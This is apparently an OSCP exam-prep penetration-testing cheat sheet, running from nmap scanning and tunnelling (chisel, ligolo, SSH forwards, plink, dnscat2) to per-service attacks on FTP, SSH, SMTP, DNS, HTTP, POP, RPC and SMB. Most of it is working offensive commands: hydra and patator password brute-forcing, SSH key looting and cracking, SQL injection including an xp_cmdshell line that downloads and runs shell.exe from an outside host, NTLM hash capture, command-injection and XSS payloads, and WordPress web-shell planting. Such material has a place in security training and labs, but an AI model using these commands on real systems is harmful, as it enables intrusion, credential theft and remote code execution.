# OSCP-Cheat-Sheet



## Nmap  
 
If using scripts, you can get script help by `nmap --script-help="nfs-*"`.

```sh
#If we want to target one ip, the following process
nmap -Pn -v -sV -sC -oN nmap.initial 192.
nmap -Pn -v -sV -sC -p- -oN nmap.allports 192.
nmap -p 161,162,10161,10162 -sU 192.168.169.220 

#NETWORK SWEEP:
nmapallports -iL ips.txt

nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2 > upips.txt
```

## Options

```shell

-Pn   skip host discovery - this allows for communication directly with the ports without sending packets to 80,443 to verify if the host is up.

##(provides service, and reason)
-vvv verbose

#(provides service, version)
-sV for versioning

-O os detection --ossscan- guess aggresive
-sT TCP connect port scan (Default without root privilege)
-p- for all ports
-sU for udp
-sn (network sweep)
-oG save to greppable file
-sC default NSE scripts
-A os detection, version detection. Traceroute, script sacnning
--open (only show open)

```
## NSE


```sh

#We can find scripts in this folder
cd /usr/share/nmap/scripts/

#If we want to download an NSE script for a vuln
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
sudo nmap --script-updatedb

# specifying safe and wildcard ftp-* scripts
# logic: and, or, not all work. "," is like "or"
nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP

# to get help on scripts:
nmap --script-help="ftp-*"

#We can also grep the TYPE of script we want and use it like so

cat script.db  | grep "\"vuln\""

sudo nmap --script "vuln" 192.168.xx.xx

#give details about the script
nmap --script-help=clamav-exec.nse

```


## Windows Port Scanning

This is a way to live off the land in Windows and perform a port scan.

```powershell
# perform full TCP connection to test if port open
Test-NetConnection -Port 445 $VICTIM_IP

# scanning multiple ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null

# limited ports to search
22,25,80,135,139,445,1443,3306,3389,5432 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("VICTIM_IP", $_)) "TCP port $_ is open"} 2>$null
```












# IGOL-NG

Use this guide:
https://4pfsec.com/ligolo

```shell
#windows
Invoke-WebRequest -Uri 192.168.45.230/windowsprivesc/ligoagent.exe -OutFile agent.exe
certutil -f -split -urlcache http://192.168.49.106/windowsprivesc/ligoagent.exe agent.exe

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert
./agent -connect 192.168.49.106:11601 -ignore-cert

#add a route
sudo ip route add 172.16.237.0/24 dev ligolo

#remove a route 
sudo ip route del 172.16.237.0/24 dev ligolo

#MONITOR connection
IP="172.16.106.100"; PORT=445; TIMEOUT=5;SLEEP=20;while true; do echo "================================="; date;timeout $TIMEOUT nc -nvz $IP $PORT || echo -e "no connection to $IP $PORT";sleep $SLEEP;done
```

# Bending with chisel


```bash
# on attack box
# start reverse socks proxy server on port 8080:
./chiselserver server -p 8000 --reverse

# on jumpbox (Windows example), set up reverse SOCKS proxy
.\chisel-x64.exe client attacker_ip:8295 R:80:VICTIM_IP:8295

./chiselserver server -p 443 --reverse
./chisel  client 192.168.45.230:443 R:80:127.0.0.1:80

```


# ssh

```ini
After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.

```bash
# all commands executed as ROOT

# View the SSH server status.
systemctl status ssh

# Restart the SSH server (Debian, Ubuntu, Mint)
systemctl restart ssh # newer systemd systems

# Stop the SSH server.
systemctl stop ssh

# Start the SSH server.
systemctl start ssh
```


### Local Port Forward 

Set up using OpenSSH's **-L** option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.

In this case, we will instruct SSH to listen on all interfaces on port **4455** on CONFLUENCE01 (**0.0.0.0:4455**), then forward all packets (through the SSH tunnel to PGDATABASE01) to port **445** on the newly-found host (**172.16.50.217:445**).

We're listening on port 4455 on CONFLUENCE01 because we're running as the _confluence_ user: we don't have the permissions to listen on any port below 1024.

Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using **ssh**, logging in as _database_admin_. We'll pass the local port forwarding argument we just put together to **-L**, and use **-N** to prevent a shell from being opened.

```shell
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

Once we've entered the password, we don't receive any output. When running SSH with the **-N** flag, this is normal. The **-N** flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.


### Remote Port Forward

We can ensure that we're in a TTY shell using Python3's _pty_ module. We will create our SSH connection to PGDATABASE01 using the _database_admin_ credentials again. In OpenSSH, a dynamic port forward is created with the **-D** option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port **9999**. We don't have to specify a socket address to forward to. We'll also pass the **-N** flag to prevent a shell from being spawned.

```shell
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

  
Let's try Proxychains with smbclient. Proxychains uses a configuration file for almost everything, stored by default at **/etc/proxychains4.conf**. We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port, and confirm that it's a SOCKS proxy (rather than any other kind of proxy). By default, proxies are defined at the end of the file. We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on CONFLUENCE01 (**socks5 192.168.50.63 9999**).

```shell
kali@kali:~$ tail /etc/proxychains4.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

Next, we can simply prepend **proxychains** to the command. Proxychains will read the configuration file, hook into the smbclient process, and force all traffic through the SOCKS proxy we specified.

```shell
proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.50.217
```

### Remote Port Forwarding

In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.
The SSH remote port forward option is **-R**, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.

In this case, we want to listen on port **2345** on our Kali machine (**127.0.0.1:2345**), and forward all traffic to the PostgreSQL port on PGDATABASE01 (**10.4.50.215:5432**).

```shell
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

We can now start probing port 2345 on the loopback interface of our Kali machine, as though we're probing the PostgreSQL database port on PGDATABASE01 directly. On our Kali machine, we will use **psql**, passing **127.0.0.1** as the host (**-h**), **2345** as the port (**-p**), and using the database credentials of the **postgres** user (**-U**) we found earlier on CONFLUENCE01.

```shell
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding

The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same **-R** option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply specify **-R 443** to the SSH command we run on CONFLUENCE01. We'll also pass the **-N** flag to prevent a shell from being opened.

```shell
ssh -N -R 443 kali@192.168.45.193
```

ust as we did in the classic dynamic port forwarding example, we can use Proxychains to tunnel traffic over this SOCKS proxy port. We'll edit our Proxychains configuration file at **/etc/proxychains4.conf** on our Kali machine to reflect our new local SOCKS proxy port.

```shell
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 443
```

We can then run **nmap** with **proxychains** as we did before, this time against MULTISERVER03.

```shell
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

###  SSH on Windows

SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.

```powershell
# check if SSH is on Windows
where ssh.exe

# check if version >= 7.6, so we can use Reverse Dynamic forwarding
ssh.exe -V
```

The other option is to copy **`plink.exe`** over to the Windows box.

> ⚠ **NOTE:** If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!

```sh
# grab copy of plink and host on http for Windows victim
cp /usr/share/windows-resources/binaries/plink.exe .
python -m http.server 80

# on windows, download it
iwr http://LISTEN_IP/plink.exe -outfile C:\Windows\Temp\plink.exe

# use plink similar to ssh, with addition of '-l USER -pw PASSWD'
# Note: echo y accepts host key on non-interactive shells.
# This command opens up the victim's firewalled RDP to your kali box.
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP
```


## Bending with `dnscat2`

[Dnscat2](https://github.com/iagox86/dnscat2) is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.

```sh
# on your DNS Nameserver, start the dnscat2 server:
dnscat2-server mydomain.com

# on your victim, start the dnscat2 client
./dnscat mydomain.com


# on your DNS Nameserver, in the dnscat2 command shell:
# list active sessions (windows)
dnscat2> windows
# interact with window/session 1
dnscat2> window -i 1
# get help, listing all commands
command (victim01) 1> ? # or 'help'
# get command help for 'listen' (sets up local fwd like ssh -L)
command (victim01) 1> listen --help
# start local port forwarding
command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
# if you mess up and have to change the listening port,
# you have to kill the client and restart it.
# It's usually better to just pick a different listen port if you can.
# return to main command screen
command (victim01) 1> shutdown
# (after restarting victim client, you can retry your port forward)
# if you want to return to the top level command window
# without killing the client:
command (victim01) 1> suspend


# on kali:
# now you can use your newly forwarded port to reach inside the victim network:
smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
# connection will be very slow.
```


## FTP - 21

**easy fruit logins**:

```sh #try this in the beggining 
nmap --script ftp-* -p 21 {IP}

hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://1

hydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://1
```

**Connecting & Interaction:**

```sh
# ways to connect, in order of preference
ftp -A VICTIM_IP # '-A' forces active mode (not passive)

# interaction using the 'ftp' app
- anonymous : anonymous
- anonymous :
- ftp : ftp
ftp> anonymous # username
ftp> anonymous # password
ftp> help # show list of supported commands
ftp> help CMD # show command-specific help
ftp> binary # set transmission to binary instead of ascii
ftp> ascii # set transmission to ascii instead of binary
ftp> ls -a # list all files (even hidden) (yes, they could be hidden)
ftp> cd DIR # change remote directory
ftp> lcd DIR # change local directory
ftp> pwd # print working directory
ftp> cdup  # change to remote parent directory
ftp> mkdir DIR # create directory
ftp> get FILE [NEWNAME] # download file to kali [and save as NEWNAME]
ftp> mget FILE1 FILE2 ... # get multiple files
ftp> put FILE [NEWNAME] # upload local file to FTP server [and save as NEWNAME]
ftp> mput FILE1 FILE2 ... # put multiple files
ftp> rename OLD NEW # rename remote file
ftp> delete FILE # delete remote file
ftp> mdelete FILE1 FILE2 ... # multiple delete remote files
ftp> mdelete *.txt # delete multiple files matching glob pattern
ftp> bye # exit, quit - all exit ftp connection

# Check `/etc` folder.
ftpusers
ftpusers
ftp.conf
proftpd.conf
vsftpd.conf
```

**Batch Download (all files)**:

```sh
# '-m' mirrors the site, downloading all files
wget -m ftp://anonymous:anonymous@VICTIM_IP
wget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP
```


## SSH/SFTP - 22

### SSH Credential Bruteforcing

```sh
# using hydra
#-vV to test status 
# spray creds to entire subnet with /24
hydra -u -f -L /usr/share/wordlists/seclists/Usernames/ssh.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt -s 22 ssh://192.168.238.64 

hydra -f -l username -P /usr/share/wordlists/rockyou.txt -W 5 ssh://192.168.238.64

# using patator: useful when services (e.g. ssh) are too old for hydra to work
patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

```

### Remove known hosts to resolve any possible ISSUES
```shell
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com
```

Use Legacy Key Exchange Algorithm or Cipher with SSH If you try to ssh onto a host and get an error like:

```
Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.

You can also specify the `KexAlgorithms` variable in the ssh-config file.

Similarly, if you get an error like:

```
Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
```

You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.

### ID_RSA looting SSH key 

```shell
Where the SSH private key can be found
/home/alfred/.ssh/id_rsa

#make SURE to check which account you are using 
chmod 600 id_rsa
#depending on the rule
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

### Looting from SSH 

```shell

scp /path/to/example.txt root@192.168.45.185:/home/kali/offsec/ #or try /tmp/

```

## SMTP/s - 25,465,587

```sh

# basic enumeration
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.

smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t $ip

EXPN  # get mailing list
VRFY root  # check if you can use VRFY to enumerate users
```

## DNS - 53

**PRO TIP**: Make sure you add the DNS entries you discover to your
`/etc/hosts` file. Some web servers do redirection based on domain name!

**Format of `/etc/hosts` entry with multiple subdomains**:

```
10.10.10.10     victim.com mail.victim.com
```

**General Purpose Enumeration**:

```sh
# dnsenum does full recon, including attempting zone transfers and bruteforcing
# specify "--noreverse" to avoid reverse-IP lookups
dnsenum domain.tld

# can also use dnsrecon, but takes a little more work to specify full enumeration
dnsrecon -a -s -b -y -k -w -d domain.tld

# fierce does a more abbreviated full-enumeration (good for preliminary look)
fierce --domain domain.tld

# dig zone xfer, note "@" before nameserver
dig @ns1.domain.tld -t axfr domain.tld

# get DNS records by type (MX in this case)
host -t MX example.com
```

DNS Queries on Windows:

```powershell
nslookup www.example.com

# Advanced, specify record type and nameserver
nslookup -type=TXT www.example.com ns1.nameserver.com
```

**Common record types**:

- `NS`: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- `A`: Also known as a host record, the "A record" contains the IP address of a hostname (such as www.example.com).
- `MX`: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- `PTR`: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- `CNAME`: Canonical Name Records are used to create aliases for other host records.
- `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

### 2.4.1 DNS Zone Transfer

This is basically asking for a copy of all DNS entries served by an authoritative server.
It lets you get a list of other subdomains that might be of interest.
If a server is configured properly, it won't give you this info.

```sh

# using dnsrecon
dnsrecon -t axfr -d domain.tld

# using dig, note "@" before nameserver
dig @ns1.nameserver.tld axfr domain.tld

# using host (order of args matters)
host -l domain.tld ns1.nameserver.tld
```

### 2.4.2 Bruteforcing DNS Records

```bash
# using dnsrecon
dnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld

# specifying a file with dnsenum, also performs normal full enum
dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld

# using nmap dns-brute script
nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld

# scan through list of subdomains/hostnames using just bash
for subdomain in $(cat list.txt); do host $subdomain.example.com; done

# scan through IP space doing reverse DNS lookups
for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
```

## Finger - 79

If the `finger` service is running, it is possible to enumerate usernames.

```sh
nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
```


## HTTP(s) - 80,443

### Directories 

```shell
# First Gobuster
gobuster dir -erkw /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -s "200,301,304" --status-codes-blacklist "" -u http://$IP 

# auth header
gobuster dir -eqrkw /usr/share/dirb/wordlists/common.txt -t 50 -x "txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf,pdf" -o gobuster-common.txt -s "200,301,304" --status-codes-blacklist "" -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -u http://$IP 

#ferox
feroxbuster -x txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf,pdf -C 404,403,400 --redirects --no-state -u http://192.168.219.144 

feroxbuster -C 404,403,400 -w /usr/share/dirbuster/wordlists/common.txt -u http://192.168.219.144/.git/ --redirects --no-state

#--dont-scan http://site.xyz/soft404

subdirectories
ffuf -w  /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://FUZZ.upright.com:43500 -mc all -c -v


```

#### Wordlists

```
Good wordlists to try:
/usr/share/dirb/wordlists/common.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

### Directory Traversal /LFI/ RFI

Look for Apache 2.4.49
Rfi requires `allow_url_include` is enabled on /php.ini
ALSO LOOK FOR AN NTLM HASH ON WINDOWS WITH FILE://
or port :445 
Automate

```shell
gobuster dir -p /home/kali/offsec/upload/gobuster/L1.txt -qw /home/kali/offsec/upload/gobuster/linux_files.txt -t 25 -s "200,301,304,403" --status-codes-blacklist "" -u 'http://192.168.231.141'  

gobuster dir -p /home/kali/offsec/upload/gobuster/L3.txt -qw /home/kali/offsec/upload/gobuster/windows_files.txt -t 25 -s "200,301,304,403" --status-codes-blacklist "" -u 'http://192.168.231.141'  

#look for
- `/etc/passwd`
- `/etc/shadow` if permissions allow
- `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
- `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
  - also `id_dsa`, `id_ecdsa`, and `id_ed25519`
  - Here we leverage the usernames we found in passwd
```

### Web Credential Bruteforcing

Get a wordlist and emails from the site using `cewl`:

```sh
# save emails to file, min word length = 5
cewl -e --email_file emails.txt -m 5 -w cewl.txt http://VICTIM_IP
```

Hydra is great for hitting web login forms. To use it, first capture a failed login using Burp. You need that to see how it submits the login request and to see how to identify a failed login.

Web Forms (POST request):

```bash

# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
# change to https-web-form for port 443
hydra -f -l admin -P /usr/share/wordlists/rockyou.txt $VICTIM_IP http-post-form "/login:username=^USER^&password=^PASS^:Data error" -t 64

hydra -V -f -L sql.txt -P sql.txt $VICTIM_IP http-post-form "/login:username=^USER^&password=^PASS^:Data error" -t 64

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.208.121 http-post-form '/login.aspx:__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2RkL7UlJbQLRVEHtdBd2cHsgmzduFNoWHiXrVGu0cD9%2Bjc%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAATHRQHJ3fxgbABeqXLtYnwsG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6vZhOhYNI15ms6KxT68HdWaGxCBK67o39S7upoRJaNfM%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=^USER^&ctl00%24ContentPlaceHolder1%24PasswordTextBox=^PASS^&ctl00%24ContentPlaceHolder1%24LoginButton=Login:Invalid' -t 64



```

HTTP BasicAuth (GET request):

```bash
# hydra http basic auth brute force
# Use https-get for https
# '-u' loops users before moving onto next password
hydra -u -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC"
```

CSRF Tokens defeat hydra, so use `patator`: (documentation in [`patator.py`](https://github.com/lanjelot/patator/blob/master/patator.py))

```sh
# before_urls visits the login page where the CSRF token is
# before_egrep uses regex to extract the CSRF token
# bug in reslover means you have to tell it to resolve IP to itself
# use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.
patator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url="http://VICTIM_IP/login" body='csrf_token=__CSRF__&usernameD=FILE0&password=FILE1' 0=users.txt 1=cewl.txt before_urls="http://VICTIM_IP/login" before_egrep='__CSRF__:value="(\w+)" id="login__csrf_token"' -x ignore:fgrep='No match'
```

### Web parameters

```shell
#When it comes time to enumerate parameter, REMEMBER, you can do directory/name or name/directory. Both ways
gobuster fuzz -u http://192.168.216.143/index.php?pagina=FUZZ  -w /usr/share/wordlists/dirb/big.txt -b 403 --exclude-length 0

ffuf

```

### SQL Injection

```sql
' OR 1=1 #'

--This tells us that there are two columns returned by the SQL quer
' UNION ALL select 1, 2, 3 #'

--Moving on, faced with a blind SQL injection attempt, we can try to use the WAITFOR DELAY command to validate success of our SQL commands. After playing with various syntaxes, we encounter a noticable 10 second delay with the following input.
'; IF (1=1) WAITFOR DELAY '0:0:10'; #'

sudo responder -I tun0
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.106\test'; #'

--Reverse shell if the injectable field is directly communicated to the database 
' EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri 192.168.49.106/shell.exe -OutFile C:\Users\Public\shell.exe;C:\Users\Public\shell.exe';--+-`

```

### Command Injection

https://book.hacktricks.xyz/pentesting-web/command-injection 

  ```sh
  
; whoami
&& whoami
& whoami
# surrounding with quotes

#To see if you're executing in CMD or Powershell (will print which one):
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  
```

### Cross-Site Scripting (XSS)

```php
<script>alert('XSS')</script>

```


### Website Applications (wp, drupal, etc)

**WordPress**
```sh
wpscan --update -o wp-scan.txt --url http://$VICTIM_IP/

# --enumerate options:
# p = Popular plugins
# vp = Vulnerable plugins
# ap = All plugins (takes a while)
# t = Popular themes
# vt = Vulnerable themes
# at = All themes (takes a while)
# cb = Config backups
# tt = Timthumbs
# dbe = Db exports
# u = usernames w/ ids 1-10
# m = media IDs 1-10
# NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m

# other useful flags:
# --login-uri URI
#     The URI of the login page if different from /wp-login.php
# --random-user-agent, --rua
#     Be a bit more stealthy
# --update
#     update the WPScan database before scanning

# username / password bruteforce possible
# -U, --usernames LIST
#     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
#     Will auto-enum users if -U not supplied
# -P, --passwords FILE-PATH
#     path to password file for brute force

# aggressive scan:
wpscan --update \
       --random-user-agent \
       --enumerate ap,at,cb,dbe,u \
       --detection-mode aggressive \
       --plugins-detection aggressive \
       --plugins-version-detection aggressive \
       --url http://$VICTIM_IP/

# scan with cmsmap (https://github.com/Dionach/CMSmap):
cmsmap -o cmsmap.txt -d http://$VICTIM_IP
```

Also try logging into the Wordpress admin page (`/wp-admin`).

If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.

After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. Remember to activate plugin after install.

[WordPress Plugin Webshell](https://github.com/p0dalirius/Wordpress-webshell-plugin) - accessible via `/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id`

Maybe upload Media file that has PHP script?

Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).

```bash
# Extract usernames and passwords:
mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```


**Drupal**
```sh
droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
```

**Joomla**
```sh
joomscan --ec -u $VICTIM_IP # if joomla found
```

## POP - 110,995

Post Office Protocol (POP) retrieves email from a remote mail server.

```sh

# basic scan
nmap -n -v -p110 -sV --script="pop3-* and safe" $VICTIM_IP

# Bruteforcing
hydra -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3
hydra -f -S -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -s 995 $VICTIM_IP pop3

# user enum / log in
nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
USER username
PASS password
LIST # gets list of emails and sizes
RETR 1 # retrieve first email
# try real (root) and fake users to see if there is a difference in error msgs
```

## RPCbind - 111

Gets you list of ports open using RPC services. Can be used to locate NFS
or rusersd services to pentest next.

```sh
# banner grab
nc -nv $VICTIM_IP 111

# list short summary of rpc services
rpcinfo -s $VICTIM_IP
# list ports of rpc services
rpcinfo -p $VICTIM_IP

# try connecting with null session
rpcclient -U "" $VICTIM_IP
rpcclient $> enumdomusers
rpcclient $> queryuser 0xrid_ID
# see MSRPC (port 135) for more commands
```


## NNTP - 119

Network News Transfer Protocol, allows clients to retrieve (read) and post
(write) news articles to the NNTP (Usenet) server.

```sh
# banner grab, interact/view articles
nc -nvC $VICTIM_IP 119   # "-C" required for \r\n line endings
HELP  # list help on commands (not always available)
LIST  # list newsgroups, with 1st and last article numbers in each group
GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
LAST  # view last article in newsgroup
ARTICLE msgID   # view article by ID
NEXT  # go to next article
QUIT
# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
# https://tools.ietf.org/html/rfc977
```


## SMB ~ SMB 445 135,137,139

SMB Scans:

```sh
# nmap script scans
nmap -p 139,445 --script smb-vuln* 192.168

# list shares
# scan all the things
enum4linux -aMld 192.168 | tee enum4linux.log

# try with guest user if getting nothing via null session:
enum4linux -u guest -aMld 192. | tee enum4linux.log

```

Interact with SMB:

```bash
#connect to it #help #shares
impacket-smbclient 'mountuser:DRtajyCwcbWvH/9@172.16.93.21'

# List with smbmap, without SHARENAME it lists everything
# -R for the share name we want to see 
smbmap -H 192.168.231.248 -u 'emma@relia.com' -p 'welcome1' -r transfer
smbmap -u "username" -p "<LM>:<NT>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash

# Interactive smb shell with creds
# -U 'username%NTHASH' --pw-nt-hash 
smbclient -N -L 192.168.
smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username[%password]
smbclient '\\192.168.231.248\transfer' -U mark@relia.com 

smb:\> help  # displays commands to use
smb:\> ls  # list files
smb:\> get filename.txt  # fetch a file
smb:\> open 

# mount smb share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

```

Listing SMB Shares from Windows:

```powershell
# view shares on local host
net share

# /all lets us see administrative shares (ending in '$').
# Can use IP or hostname to specify host.
net view \\VICTIM /all
```

Common shares for Windows:

- C$ - maps to C:/
- ADMIN$ - maps to C:/Windows
- IPC$ - used for RPC
- Print$ - hosts drivers for shared printers
- SYSVOL - only on DCs
- NETLOGON - only on DCs

**NOTE:** In recent versions of Kali, when connecting with `smbclient`, you might see an error message like:

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`

```
client min protocol = CORE
client max protocol = SMB3
```

Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`

----

Port 135 is MSRPC. Port 139 is NetBIOS (legacy: 137, 138?), which is tied to SMB for backwards compatibility of session management and name services.

```sh

# dump user information
# can also add creds: [[domain/]username[:password]@]<VictimIP>
impacket-samrdump -port 139 $VICTIM_IP

# interact with MSRPC
# via null session:
rpcclient $VICTIM_IP -U "" -N
# authenticated:
rpcclient $VICTIM_IP -W DOMAIN -U username -P password
# from here can enumerate users, groups, etc.
# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
srvinfo           # query server info
querydispinfo     # list users
enumdomusers      # list users
enumdomgroups     # list groups
enumdomains       # list domains
querydominfo      # domain info
lsaquery          # get SIDs
lsaenumsid        # get SIDs
lookupsids <sid>  # lookup SID
```

Users enumeration

- **List users**: `querydispinfo` and `enumdomusers`
- **Get user details**: `queryuser <0xrid>`
- **Get user groups**: `queryusergroups <0xrid>`
- **GET SID of a user**: `lookupnames <username>`
- **Get users aliases**: `queryuseraliases [builtin|domain] <sid>`

Groups enumeration

- **List groups**: `enumdomgroups`
- **Get group details**: `querygroup <0xrid>`
- **Get group members**: `querygroupmem <0xrid>`

Aliasgroups enumeration

- **List alias**: `enumalsgroups <builtin|domain>`
- **Get members**: `queryaliasmem builtin|domain <0xrid>`

Domains enumeration

- **List domains**: `enumdomains`
- **Get SID**: `lsaquery`
- **Domain info**: `querydominfo`

More SIDs

